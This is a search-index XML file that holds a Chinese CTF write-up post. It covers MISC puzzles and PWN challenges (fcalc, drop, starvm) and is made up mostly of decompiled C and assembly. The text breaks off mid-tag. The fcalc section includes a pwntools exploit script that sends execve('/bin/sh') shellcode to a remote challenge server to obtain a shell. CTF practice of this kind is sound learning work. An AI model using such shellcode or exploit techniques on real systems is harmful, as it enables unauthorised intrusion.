<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XCTF</title>
      <link href="/du-yu/xctf.html"/>
      <url>/du-yu/xctf.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、MISC"><a href="#一、MISC" class="headerlink" title="一、MISC"></a>一、MISC</h2><h3 id="（一）old-language"><a href="#（一）old-language" class="headerlink" title="（一）old language"></a>（一）old language</h3><p>龙语</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230729114755995.png" alt="image-20230729114755995"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230729114823127.png" alt="image-20230729114823127"></p><p>*ctf{GIKRVZY}</p><h3 id="（二）snippingTools"><a href="#（二）snippingTools" class="headerlink" title="（二）snippingTools"></a>（二）snippingTools</h3><p><strong>题目：</strong>Alice在参加某个CTF比赛，她成功的解出了一道题，拿到了flag。她很开心，迫不及待地想要向Bob分享她的喜悦。于是按下了快捷键<code>Shift+Win+S</code>使用了Windows 11的截图工具，截取了整个屏幕，并且保存为文件<code>1.png</code>。然后，考虑到比赛规则中规定flag需要保密，她使用了截图工具中的“裁剪”功能，将flag裁剪掉了一部分，然后将裁剪结果覆盖了原文件<code>1.png</code>并保存。最终，她将<code>1.png</code>发给了Bob。Bob马上就知道了她的整个flag，你知道是如何做到的吗？</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230729155216028.png" alt="image-20230729155216028"></p><p>如果存在一个 Windows 截图工具的 CVE，其中它可能在截图过程中留下一些无法删除的元数据，或者可能在截图后不完全清除原始屏幕数据，那么你可能可以利用这个漏洞来恢复 flag。</p><h2 id="二、PWN"><a href="#二、PWN" class="headerlink" title="二、PWN"></a>二、PWN</h2><h3 id="（一）fcalc（浮点数）"><a href="#（一）fcalc（浮点数）" class="headerlink" title="（一）fcalc（浮点数）"></a>（一）fcalc（浮点数）</h3><h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">  void *s; // [rsp+28h] [rbp-30h]  // 一个用于存放浮点数的缓冲区的起始指针  void *buf; // [rsp+30h] [rbp-28h] // 一个用于存放输入的缓冲区的起始指针  double v13; // [rsp+38h] [rbp-20h] // 临时浮点数变量  unsigned __int64 v14; // [rsp+40h] [rbp-18h] // 用于存放canary的值，防止栈溢出  v14 = __readfsqword(0x28u); // 读取canary的值  v3 = alloca(400LL); // 分配400字节的空间存放浮点数  s = v6;   v4 = alloca(64LL); // 分配64字节的空间用于存放输入  buf = v6;   memset(v6, 0, 0x180uLL); // 将浮点数缓冲区初始化为0  memset(buf, 0, 0x30uLL); // 将输入缓冲区初始化为0  qword_40E0 = (__int64)s; // 全局变量，存放当前栈顶指针  dword_4010 = 0; // 全局变量，记录输入的数字个数  sub_1384(); // 未提供函数的功能，可能是初始化函数  sub_14C9(); // 未提供函数的功能，可能是初始化函数  while ( 1 )  {    v7 = read(0, buf, 0x180uLL); // 从标准输入读取最多0x180字节的数据到输入缓冲区    if ( v7 &gt; 47 )       v7 = 48; // 如果输入的字节数超过47个，就把它们限制在48个以内    for ( i = 0; i &lt; v7 &amp;&amp; *((_BYTE *)buf + i) != 10; ++i ) // 遍历输入的每一个字符    {      if ( *((char *)buf + i) &lt;= 32 || *((char *)buf + i) &gt; 48 ) // 对于非数字和非'.'的字符      {        if ( *((char *)buf + i) &gt; 47 &amp;&amp; *((char *)buf + i) &lt;= 57 ) // 对于数字字符        {          if ( dword_4010 &gt; 47 ) // 如果输入的数字个数超过47个          {            puts("ERROR");            exit(1); // 输出错误并退出          }          ++dword_4010; // 增加数字计数器          v5 = (double *)qword_40E0; // 从当前栈顶获取double类型的指针          *v5 = atof((const char *)buf + i); // 转换当前字符为浮点数并存入栈中          qword_40E0 += 8LL; // 栈顶指针上移          while ( *((_BYTE *)buf + i + 1) == 46 || *((char *)buf + i + 1) &gt; 47 &amp;&amp; *((char *)buf + i + 1) &lt;= 57 )            ++i; // 跳过剩余的数字字符        }      }      else // 对于'.'或数字字符      {        if ( dword_4010 &lt;= 1 ) // 如果输入的数字个数少于等于1个        {          puts("ERROR");          exit(1); // 输出错误并退出        }        v10 = (double *)s; // 从缓冲区起始位置获取double类型的指针        for ( j = 0; j &lt;= 47; ++j ) // 遍历输入的每一个数字        {          v13 = fabs(*v10); // 取绝对值          if ( v13 != 0.0 &amp;&amp; (v13 &lt; 1.0 || v13 &gt; 100.0) ) // 如果浮点数不在1到100的范围内          {            printf("ERROR: %lf\n", v13);            exit(1); // 输出错误并退出          }          ++v10; // 指针上移        }        ((void (*)(void))qword_4060[*((char *)buf + i) - 32])(); // 从函数表中调用相应的函数      }    }    if ( (unsigned __int64)s &lt; qword_40E0 ) // 如果栈中有数据      printf("Result: %lf\n", *(double *)(qword_40E0 - 8)); // 打印结果  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="1-Canary函数"><a href="#1-Canary函数" class="headerlink" title="1.Canary函数"></a>1.Canary函数</h5><p>“Canary”是一种用于防止栈溢出攻击的安全机制。其基本思想是在函数的局部变量和返回地址之间放置一个随机值，这个随机值就被称为”Canary”。</p><p>当函数运行时，Canary的值会被保存下来。在函数结束返回之前，程序会检查Canary的值是否被修改。如果被修改，那么很可能是因为发生了栈溢出，此时程序会立即终止，防止攻击者利用栈溢出覆盖返回地址，进而控制程序的执行流程。</p><p>在你给出的代码中，<code>unsigned __int64 v14;</code>被用于存储Canary的值，而<code>v14 = __readfsqword(0x28u);</code>则是从特定的位置读取Canary的值。这是一个常见的防护措施，用于防止栈溢出攻击。</p><p>如果这个程序没有正确地实施Canary保护，或者有其他的漏洞允许攻击者绕过Canary保护，那么这个程序可能就存在安全风险。</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame; __int64 (__fastcall *sub_1384())()sub_1384 proc near; __unwind {endbr64push    rbpmov     rbp, rspmov     rax, cs:stdinmov     ecx, 0          ; nmov     edx, 2          ; modesmov     esi, 0          ; bufmov     rdi, rax        ; streamcall    _setvbufmov     rax, cs:stdoutmov     ecx, 0          ; nmov     edx, 2          ; modesmov     esi, 0          ; bufmov     rdi, rax        ; streamcall    _setvbufmov     rax, cs:stderrmov     ecx, 0          ; nmov     edx, 2          ; modesmov     esi, 0          ; bufmov     rdi, rax        ; streamcall    _setvbuflea     rax, sub_136Dmov     cs:qword_4060, raxlea     rax, sub_136Dmov     cs:qword_4068, raxlea     rax, sub_136Dmov     cs:qword_4070, raxlea     rax, sub_136Dmov     cs:qword_4078, raxlea     rax, sub_136Dmov     cs:qword_4080, raxlea     rax, sub_136Dmov     cs:qword_4088, raxlea     rax, sub_136Dmov     cs:qword_4090, raxlea     rax, sub_136Dmov     cs:qword_4098, raxlea     rax, sub_136Dmov     cs:qword_40A0, raxlea     rax, sub_136Dmov     cs:qword_40A8, raxlea     rax, sub_12BBmov     cs:qword_40B0, raxlea     rax, sub_1209mov     cs:qword_40B8, raxlea     rax, sub_136Dmov     cs:qword_40C0, raxlea     rax, sub_1262mov     cs:qword_40C8, raxlea     rax, sub_136Dmov     cs:qword_40D0, raxlea     rax, sub_1314mov     cs:qword_40D8, raxnoppop     rbpretn; } // starts at 1384sub_1384 endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ctrl-s"><a href="#ctrl-s" class="headerlink" title="ctrl + s"></a>ctrl + s</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230729222929053.png" alt="image-20230729222929053"></p><h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import*#io = process("./pwn")io = remote("61.147.171.105",50542)elf = ELF("./fcalc")context.terminal = ['tmux','splitw','-h']libc = ELF("/lib/ld-linux.so.2")#libc = ELF("./libc-2.31.so")context.arch = "amd64"context.log_level = "debug"def debug():    gdb.attach(io)    pause()io.recvuntil("Enter your expression:")shellcode = """add rsp,0x10jmp rsp"""payload = b'\x35\x40\x35\x40\x30\x30\x30\x30'+b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+cyclic(0x21)+p64(0x4014000000000000)*2+asm(shellcode)+b'\x40\x40'# gdb.attach(io,'b *$rebase(0x187a)')# pause(0)io.send(payload)# pause()io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二-drop"><a href="#二-drop" class="headerlink" title="(二)drop"></a>(二)drop</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall sub_1CFA0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, char a5){  unsigned __int64 v5; // r12  unsigned int v7; // eax  int v8; // ecx  void (*v9)(int); // rsi  __int64 v10; // rax  unsigned __int64 v11; // rbx  __int64 v12; // r13  pthread_t v13; // rax  void (*v14)(int); // r14  size_t *v15; // rbp  unsigned __int64 v16; // r12  unsigned __int64 v17; // rdx  unsigned __int64 v18; // rbx  __int64 v19; // rax  __int64 v20; // rbx  void **v22; // rdx  __int64 v23; // rsi  const char *v24; // rdi  __int64 v25; // rax  __int64 v26; // rax  void **v27; // r8  void *v28[2]; // [rsp+0h] [rbp-158h] BYREF  size_t stacksize; // [rsp+10h] [rbp-148h] BYREF  __int64 (__fastcall *v30)(); // [rsp+18h] [rbp-140h]  __int64 v31; // [rsp+20h] [rbp-138h]  __int64 v32[2]; // [rsp+30h] [rbp-128h] BYREF  void **v33; // [rsp+40h] [rbp-118h]  __int64 v34; // [rsp+48h] [rbp-110h]  size_t *p_stacksize; // [rsp+50h] [rbp-108h]  __int64 v36; // [rsp+58h] [rbp-100h]  struct sigaction fds; // [rsp+60h] [rbp-F8h] BYREF  __int64 v38[2]; // [rsp+100h] [rbp-58h] BYREF  __int64 v39; // [rsp+110h] [rbp-48h]  __int64 v40; // [rsp+118h] [rbp-40h]  size_t *v41; // [rsp+120h] [rbp-38h] BYREF  v40 = a2;  v39 = a1;  fds.sa_handler = 0LL;  *(_OWORD *)fds.sa_mask.__val = xmmword_41AB0;  do  {    if ( poll((struct pollfd *)&amp;fds, 3uLL, 0) != -1 )    {      if ( (BYTE6(fds.sa_sigaction) &amp; 0x20) != 0 &amp;&amp; open64("/dev/null", 2, 0LL) == -1        || (fds.sa_mask.__val[0] &amp; 0x20000000000000LL) != 0 &amp;&amp; open64("/dev/null", 2, 0LL) == -1 )      {        goto LABEL_45;      }      if ( (fds.sa_mask.__val[1] &amp; 0x20000000000000LL) == 0 )        goto LABEL_21;LABEL_20:      if ( open64("/dev/null", 2, 0LL) != -1 )        goto LABEL_21;LABEL_45:      abort();    }    v7 = *_errno_location();  }  while ( v7 == 4 );  if ( v7 &gt; 0x16 )    goto LABEL_45;  v8 = 4200448;  if ( !_bittest(&amp;v8, v7) || fcntl(0, 1) == -1 &amp;&amp; *_errno_location() == 9 &amp;&amp; open64("/dev/null", 2, 0LL) == -1 )    goto LABEL_45;  if ( fcntl(1, 1) == -1 &amp;&amp; *_errno_location() == 9 &amp;&amp; open64("/dev/null", 2, 0LL) == -1 )    goto LABEL_45;  if ( fcntl(2, 1) == -1 &amp;&amp; *_errno_location() == 9 )    goto LABEL_20;LABEL_21:  v9 = (void (*)(int))(&amp;dword_0 + 1);  switch ( a5 )  {    case 0:      goto LABEL_25;    case 1:      byte_54138 = 1;      goto LABEL_26;    case 2:      goto LABEL_24;    case 3:      v9 = 0LL;LABEL_24:      byte_54138 = 1;LABEL_25:      if ( signal(13, v9) == (__sighandler_t)-1LL )      {        fds.sa_mask.__val[1] = (unsigned __int64)&amp;off_52280;        fds.sa_mask.__val[2] = 1LL;        fds.sa_handler = 0LL;        fds.sa_mask.__val[3] = (unsigned __int64)"Index out of bounds()/rustc/90c541806f23a127002de5b4038be731ba1458ca/li"                                                 "brary/core/src/str/pattern.rs";        fds.sa_mask.__val[4] = 0LL;        stacksize = (size_t)&amp;fds;        v30 = sub_3C930;        v33 = &amp;off_516A0;        v34 = 2LL;        v32[0] = 0LL;        p_stacksize = &amp;stacksize;        v36 = 1LL;        v26 = sub_20230(v28, v32);        sub_BBB0(v26);LABEL_49:        sub_25E50();      }LABEL_26:      memset(&amp;fds, 0, sizeof(fds));      sigaction(11, 0LL, &amp;fds);      if ( !fds.sa_handler )      {        fds.sa_flags = 134217732;        fds.sa_handler = (__sighandler_t)sub_25710;        sigaction(11, &amp;fds, 0LL);        byte_54128 = 1;      }      sigaction(7, 0LL, &amp;fds);      if ( !fds.sa_handler )      {        fds.sa_flags = 134217732;        fds.sa_handler = (__sighandler_t)sub_25710;        sigaction(7, &amp;fds, 0LL);        byte_54128 = 1;      }      qword_54120 = sub_259F0();      v10 = sysconf(30);      qword_54130 = v10;      v11 = v10;      if ( !v10 )      {        v22 = &amp;off_52238;        v23 = 32LL;        v24 = (const char *)&amp;unk_42708;LABEL_54:        sub_87E0(v24, v23, v22);      }      v12 = v10;      memset(&amp;fds, 0, 56);      v13 = pthread_self();      if ( pthread_getattr_np(v13, (pthread_attr_t *)&amp;fds) )      {        v14 = 0LL;        goto LABEL_41;      }      v28[0] = 0LL;      stacksize = 0LL;      v15 = &amp;stacksize;      LODWORD(v38[0]) = pthread_attr_getstack((const pthread_attr_t *)&amp;fds, v28, &amp;stacksize);      if ( LODWORD(v38[0]) )      {        v27 = &amp;off_52208;        v15 = (size_t *)v38;        goto LABEL_52;      }      v16 = (unsigned __int64)v28[0];      LODWORD(stacksize) = pthread_attr_destroy((pthread_attr_t *)&amp;fds);      if ( (_DWORD)stacksize )      {        v27 = &amp;off_52220;LABEL_52:        v33 = 0LL;        sub_6B70(0LL, v15, &amp;unk_429D4, v32, v27);      }      if ( (v11 | v16) &gt;&gt; 32 )        v17 = v16 % v11;      else        v17 = (unsigned int)v16 % (unsigned int)v11;      v18 = v11 - v17;      if ( !v17 )        v18 = 0LL;      v5 = v18 + v16;      v11 = v5 - v12;      v14 = (void (*)(int))(&amp;dword_0 + 1);LABEL_41:      sub_3B250(&amp;stacksize, &amp;unk_4294C, 4LL);      if ( v31 )      {        v41 = &amp;stacksize;        v28[0] = &amp;v41;        v28[1] = sub_138E0;        fds.sa_mask.__val[1] = (unsigned __int64)&amp;off_516C0;        fds.sa_mask.__val[2] = 1LL;        fds.sa_handler = 0LL;        fds.sa_mask.__val[3] = (unsigned __int64)v28;        fds.sa_mask.__val[4] = 1LL;        v38[0] = (__int64)&amp;fds;        v38[1] = (__int64)sub_3C930;        v33 = &amp;off_516A0;        v34 = 2LL;        v32[0] = 0LL;        p_stacksize = (size_t *)v38;        v36 = 1LL;        v25 = sub_20230(v28, v32);        sub_BBB0(v25);        goto LABEL_49;      }      v19 = sub_1D870(stacksize, v30);      fds.sa_handler = v14;      fds.sa_mask.__val[0] = v11;      fds.sa_mask.__val[1] = v5;      sub_22FB0(&amp;fds, v19);      v20 = (*(int (__fastcall **)(__int64))(v40 + 40))(v39);      if ( dword_54034 != 4 )      {        LOBYTE(v32[0]) = 1;        fds.sa_handler = (__sighandler_t)v32;        sub_7970(&amp;fds);      }      return v20;    default:      v22 = &amp;off_52268;      v23 = 40LL;      v24 = "internal error: entered unreachable code/rustc/90c541806f23a127002de5b4038be731ba1458ca/library/alloc/src/co"            "llections/btree/navigate.rs/rustc/90c541806f23a127002de5b4038be731ba1458ca/library/alloc/src/vec/mod.rs/carg"            "o/registry/src/index.crates.io-6f17d22bba15001f/gimli-0.26.2/src/read/line.rs";      goto LABEL_54;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="1-Index-out-of-bounds-x2F-rustc-x2F-90c541806f23a127002de5b4038be731ba1458ca-x2F-li”"><a href="#1-Index-out-of-bounds-x2F-rustc-x2F-90c541806f23a127002de5b4038be731ba1458ca-x2F-li”" class="headerlink" title="1.Index out of bounds()/rustc/90c541806f23a127002de5b4038be731ba1458ca/li”"></a>1.Index out of bounds()/rustc/90c541806f23a127002de5b4038be731ba1458ca/li”</h5><pre><code>                                             "brary/core/src/str/pattern.rs";</code></pre><p>你提供的字符串中包含了一些有关Rust语言运行时错误的信息。这条信息的格式建议该错误出自于 Rust 编译器产生的代码，具体来说是 Rust 的标准库（standard library）中的一部分。</p><p><code>"Index out of bounds()"</code> 表示发生了一个索引越界的错误。在 Rust 中，尝试访问数组或者向量（vector）等容器类数据结构中一个无效（例如，过大）的索引时，会出现这种错误。</p><p><code>/rustc/90c541806f23a127002de5b4038be731ba1458ca/library/core/src/str/pattern.rs</code> 是错误发生的地方，它给出了具体的文件路径和文件名。这个路径表示错误发生在 Rust 的标准库 <code>core</code> 中的 <code>str</code> 模块的 <code>pattern.rs</code> 文件中。<code>rustc/90c541806f23a127002de5b4038be731ba1458ca</code> 部分则指的是错误发生时 Rust 编译器的具体版本。</p><p>通常，当你看到这种错误时，需要查看的是导致这个错误的代码——可能是你的代码中某处尝试访问了一个无效的索引，你需要检查你的索引是否正确，或者你的数据结构是否被正确初始化和填充。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">void __fastcall __noreturn sub_23D50(__int64 a1){  __int64 v1; // rax  __int64 v2; // r14  __int64 v3; // rax  __int64 v4[5]; // [rsp+0h] [rbp-28h] BYREF  v1 = sub_3BE40();  if ( !v1 )    sub_87E0(      (__int64)"called `Option::unwrap()` on a `None` valueassertion failed: end &gt;= start &amp;&amp; end &lt;= lenassertion failed: "               "offset != 0 &amp;&amp; offset &lt;= lenassertion failed: offset != 0 &amp;&amp; offset &lt;= len &amp;&amp; len &gt;= 2called `Result::unw"               "rap()` on an `Err` value",      43LL,      (__int64)&amp;off_51EE0);  v2 = v1;  v3 = sub_3BE30(a1);  if ( !v3 )    sub_87E0(      (__int64)"called `Option::unwrap()` on a `None` valueassertion failed: end &gt;= start &amp;&amp; end &lt;= lenassertion failed: "               "offset != 0 &amp;&amp; offset &lt;= lenassertion failed: offset != 0 &amp;&amp; offset &lt;= len &amp;&amp; len &gt;= 2called `Result::unw"               "rap()` on an `Err` value",      43LL,      (__int64)&amp;off_51EC8);  v4[0] = v3;  v4[1] = a1;  v4[2] = v2;  sub_22D20(v4);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="sub-E270"><a href="#sub-E270" class="headerlink" title="sub_E270"></a>sub_E270</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c">unsigned __int64 __fastcall sub_E270(_QWORD *a1, __int64 *a2){  __int64 v3; // rax  __int64 v4; // rax  unsigned __int64 v5; // rdi  unsigned __int64 v6; // r15  unsigned __int64 v7; // r12  __int64 v8; // r13  unsigned __int64 v9; // rdx  unsigned __int64 result; // rax  __int64 v11; // rcx  _QWORD *v12; // rdi  unsigned __int64 v13; // rax  __int64 v14; // rdx  __int64 v15; // rcx  __int64 v16; // rcx  __int64 v17; // rdi  __int64 v18; // rdx  unsigned __int64 v19; // rcx  _QWORD *v20; // r15  unsigned __int64 v21; // r12  v3 = a2[8];  if ( v3 )  {    a2[8] = v3 - 1;    if ( *a2 )    {      if ( (unsigned int)*a2 == 2 )        sub_87E0(          (__int64)"called `Option::unwrap()` on a `None` valueassertion failed: end &gt;= start &amp;&amp; end &lt;= lenassertion fail"                   "ed: offset != 0 &amp;&amp; offset &lt;= lenassertion failed: offset != 0 &amp;&amp; offset &lt;= len &amp;&amp; len &gt;= 2called `Res"                   "ult::unwrap()` on an `Err` value",          43LL,          (__int64)&amp;off_514E0);      v4 = a2[1];      v5 = a2[2];      v6 = a2[3];      if ( v6 &gt;= *(unsigned __int16 *)(v5 + 1330) )      {        do        {LABEL_5:          v7 = *(_QWORD *)(v5 + 1232);          if ( !v7 )          {            j_free((void *)v5);            sub_87E0(              (__int64)"called `Option::unwrap()` on a `None` valueassertion failed: end &gt;= start &amp;&amp; end &lt;= lenassertion "                       "failed: offset != 0 &amp;&amp; offset &lt;= lenassertion failed: offset != 0 &amp;&amp; offset &lt;= len &amp;&amp; len &gt;= 2cal"                       "led `Result::unwrap()` on an `Err` value",              43LL,              (__int64)&amp;off_514C8);          }          v6 = *(unsigned __int16 *)(v5 + 1328);          v8 = v4 + 1;          j_free((void *)v5);          v4 = v8;          v5 = v7;        }        while ( (unsigned __int16)v6 &gt;= *(_WORD *)(v7 + 1330) );        if ( !v8 )          goto LABEL_8;        goto LABEL_21;      }LABEL_20:      v7 = v5;      v8 = v4;      if ( !v4 )      {LABEL_8:        v9 = v6 + 1;        result = v7;LABEL_36:        a2[1] = 0LL;        a2[2] = result;        a2[3] = v9;        *a1 = v8;        a1[1] = v7;        a1[2] = v6;        return result;      }LABEL_21:      result = *(_QWORD *)(v7 + 8 * v6 + 1344);      v16 = v8 - 1;      if ( v8 == 1 )        goto LABEL_27;      if ( (v16 &amp; 7) != 0 )      {        v17 = 0LL;        do        {          result = *(_QWORD *)(result + 1336);          ++v17;        }        while ( (v16 &amp; 7) != v17 );        v16 -= v17;      }      if ( (unsigned __int64)(v8 - 2) &lt; 7 )      {LABEL_27:        v9 = 0LL;      }      else      {        v9 = 0LL;        do        {          result = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(result + 1336) + 1336LL)                                                                                         + 1336LL)                                                                             + 1336LL)                                                                 + 1336LL)                                                     + 1336LL)                                         + 1336LL)                             + 1336LL);          v16 -= 8LL;        }        while ( v16 );      }      goto LABEL_36;    }    v13 = a2[1];    v5 = a2[2];    if ( v13 )    {      if ( (v13 &amp; 7) == 0 )      {        v15 = a2[1];        if ( v13 &lt; 8 )          goto LABEL_19;        goto LABEL_18;      }      v14 = 0LL;      do      {        v5 = *(_QWORD *)(v5 + 1336);        ++v14;      }      while ( (a2[1] &amp; 7) != v14 );      v15 = v13 - v14;      if ( v13 &gt;= 8 )      {        do        {LABEL_18:          v5 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v5 + 1336)                                                                                                 + 1336LL)                                                                                     + 1336LL)                                                                         + 1336LL)                                                             + 1336LL)                                                 + 1336LL)                                     + 1336LL)                         + 1336LL);          v15 -= 8LL;        }        while ( v15 );      }    }LABEL_19:    *a2 = 1LL;    a2[1] = 0LL;    a2[2] = v5;    a2[3] = 0LL;    v6 = 0LL;    v4 = 0LL;    if ( !*(_WORD *)(v5 + 1330) )      goto LABEL_5;    goto LABEL_20;  }  v11 = *a2;  result = a2[1];  v12 = (_QWORD *)a2[2];  *a2 = 2LL;  if ( v11 )  {    if ( v11 != 1 || !v12 )      goto LABEL_43;    goto LABEL_42;  }  if ( !result )    goto LABEL_33;  if ( (result &amp; 7) != 0 )  {    v18 = 0LL;    do    {      v12 = (_QWORD *)v12[167];      ++v18;    }    while ( (result &amp; 7) != v18 );    v19 = result - v18;    if ( result &lt; 8 )      goto LABEL_33;LABEL_40:    result = 0LL;    do    {      v12 = *(_QWORD **)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v12[167] + 1336LL)                                                                                   + 1336LL)                                                                       + 1336LL)                                                           + 1336LL)                                               + 1336LL)                                   + 1336LL)                       + 1336LL);      v19 -= 8LL;    }    while ( v19 );    goto LABEL_42;  }  v19 = result;  if ( result &gt;= 8 )    goto LABEL_40;LABEL_33:  result = 0LL;  do  {LABEL_42:    v20 = (_QWORD *)v12[154];    v21 = result + 1;    j_free(v12);    v12 = v20;    result = v21;  }  while ( v20 );LABEL_43:  a1[1] = 0LL;  return result;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall sub_D780(__int64 a1, const void *a2, size_t a3){  _QWORD *v4; // r14  __int64 v5; // r12  v4 = *(_QWORD **)(*(_QWORD *)a1 + 8LL);  v5 = v4[2];  if ( *v4 - v5 &lt; a3 )  {    sub_6CA0(*(_QWORD *)(*(_QWORD *)a1 + 8LL), v4[2], a3);    v5 = v4[2];  }  memcpy((void *)(v5 + v4[1]), a2, a3);  v4[2] = a3 + v5;  return 0LL;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="三-starvm"><a href="#三-starvm" class="headerlink" title="(三)starvm"></a>(三)starvm</h4><h5 id="mainC源代码"><a href="#mainC源代码" class="headerlink" title="mainC源代码"></a>mainC源代码</h5><pre class="line-numbers language-c" data-language="c"><code 